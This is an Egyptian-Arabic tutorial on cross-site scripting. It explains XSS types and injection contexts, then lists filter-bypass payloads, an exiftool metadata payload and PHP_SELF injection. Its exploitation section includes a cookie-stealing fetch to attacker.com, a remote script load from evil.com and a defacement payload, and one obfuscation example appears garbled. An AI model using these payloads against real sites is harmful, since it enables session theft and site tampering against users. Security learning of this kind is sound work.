

# أول حاجة: يعني إيه XSS أصلاً؟

XSS = Cross Site Scripting
ودي واحدة من أخطر ثغرات الويب وبتشتغل كده:

1. فيه فورم أو input أو لينك في الموقع بياخد منك بيانات.
2. السيرفر بياخد البيانات دي ويحطها في الصفحة من غير ما ينضفها أو يعقمها.
3. إنت بدل ما تبعتله بيانات عادية، تحقنله كود جافاسكريبت.
4. الكود ده يتنفذ في متصفح الضحية لما يفتح الصفحة.

---

## مثال بسيط جدا:

فيه فورم بيقولك:

> اسمك ايه؟ 👤

وانت دخلت:
`Saif`

النتيجة:

```html
مرحباً Saif
```
---------------------------------------

لو دخلتله:

```html
<script>alert('XSS!')</script>
```

النتيجة:

```html
مرحباً <script>alert('XSS!')</script>
```
------------------------------------------
!!!عند الضحيه Alert هيشتغل الجافاسكريبت ويتفتح ---

# طيب بتفيدك في إيه؟

لو معاك XSS في موقع تقدر تعمل الآتي:

* تسرق الكوكيز بتاعة الضحية.
* تسرق الـ session بتاعه.
* تعمل defacement للموقع.
* تشغل أي كود في متصفح الضحية.

---

# طيب أنواع XSS إيه؟ 🤔

فيه 3 أنواع أساسيين:

| النوع         | معناه                                                                |
| ------------- | -------------------------------------------------------------------- |
| Reflected XSS | الكود بيتنفذ أول ما تبعت الريكوست                                    |
| Stored XSS    | الكود بيتخزن في السيرفر (في كومنت مثلا) ويتنفذ لما أي حد يشوف الصفحة |
| DOM-Based XSS | الكود بيتنفذ بسبب خطأ في جافاسكريبت العميل (المتصفح)                 |

---

# ندخل على التقيل بقى 🔥

## أول نوع: HTML Injection (اللي هو بسيط شوية)

لو السيرفر بياخد الكلام بتاعك وبيحطه جواه HTML.

مثال:

لو الـ input بينزل كده:

```html
<p>اهلا بيك: [INPUT]</p>
```

لو دخلتله:

```html
<script>alert(1)</script>
```

هتبقى:

```html
<p>اهلا بيك: <script>alert(1)</script></p>
```

ويتفتح الـ alert.

---

## ثاني نوع: Attribute Injection

لو مدخلك بيروح جوا Attribute زي:

```html
<img src="[INPUT]">
```

لو دخلت:

```html
x" onerror="alert(1)
```

هيطلع:

```html
<img src="x" onerror="alert(1)">
```

وأول ما اللينك ميبقاش شغال يحصل alert.

---

## ثالث نوع: SVG Payload

SVG بيشتغل في معظم المتصفحات وبيبقى كده:

```html
<svg onload=alert(1)>
```

لو موقع حاطط الـ input في أي حتة HTML ممكن تحقن الكود ده.

---

## رابع نوع: Inline Event Handlers

لما تكون بتحقن داخل خاصية من خصائص الـ HTML زي:

```html
<a href="#" onclick="[INPUT]">اضغط هنا</a>
```

لو دخلت:

```javascript
alert(1)
```

هيتنفذ أول ما يضغط الضحية.

---

# طيب لو في فلتر؟ 🤔

هنا بقى بيجي شغل الـ **Bypass Techniques**

---

## 1️⃣ Mixed Case (تغيير الحروف)

```html
<SvG OnLoAd=alert(1)>
```

---

## 2️⃣ Unclosed Tags (متقفلش التاج)

```html
<svg onload=alert(1)//
```

---

## 3️⃣ Double Encoding

يعني تبعت الكود مشفر كذا مرة.

```html
%253Csvg%2520onload%253Dalert%25281%2529%253E
```

---

## 4️⃣ بدون أقواس

لو الموقع مانع الأقواس:

```javascript
alert`1`
```

نفس نتيجة `alert(1)`

---

## 5️⃣ Obfuscation (تلعب على الفلاتر)

تكتب الكود بشكل غريب ميعديش على الفلتر:

```javascript
top 
top 
```

---

# حاجات متقدمة بقى 😎

## File Upload XSS

لو الموقع بيسمحلك ترفع صورة أو ملف، وتحط البايلود في الميتاداتا بتاع الملف:

```bash
exiftool -Artist='"><svg onload=alert(1)>' xss.jpg
```

ولما حد يفتح الصورة يتنفذ الكود.

---

## DOM-Based XSS

لما الجافاسكريبت في الصفحة هو اللي يحقن الكود:

```javascript
<img src=1 onerror=alert(1)>
```

---

## PHP\_SELF Injection

لو الموقع بيستخدم اسم الصفحة نفسه وده بيتحقن:

```bash
/page.php/"><svg onload=alert(1)>?test=123
```

---

# استغلال متقدم (Exploitation)

## سرقة الكوكيز:

```javascript
fetch('https://attacker.com/?cookie='+document.cookie)
```

---

## حقن كود عن بعد:

```javascript
with(document)body.appendChild(createElement('script')).src='//evil.com/x.js'
```

---

## تشويه الموقع:

```javascript
<svg onload="document.body.innerHTML='<h1>مفيش حاجة هنا</h1>'">
```

---

# جداول الـ Encoding

لو الموقع بيحاول يمنعك عن طريق الترميز، تقدر تبعت الحروف مشفرة:

| الحرف | HTML Entity       |
| ----- | ----------------- |
| `<`   | `&lt;` أو `%3C`   |
| `>`   | `&gt;` أو `%3E`   |
| `"`   | `&quot;` أو `%22` |
| `'`   | `&#39;` أو `%27`  |

---

# نصيحة أخيرة:

> كل موقع وليه ظروفه، يعني كل مرة بتلعب فيها لازم تجرب أكتر من طريقة لحد ما توصل للباي لود اللي يعدي من الفلاتر.

---

# 🏁 ملخص سريع

* XSS = حقن جافاسكريبت
* أنواعها: Reflected - Stored - DOM
* فين بتحقن؟ (HTML - Attribute - Javascript - DOM)
* ازاي تتخطى الفلاتر؟ Mixed Case, Encoding, Unclosed Tags, Obfuscation
* الاستغلال: Cookie Stealing - Defacement - Remote Code Execution

---
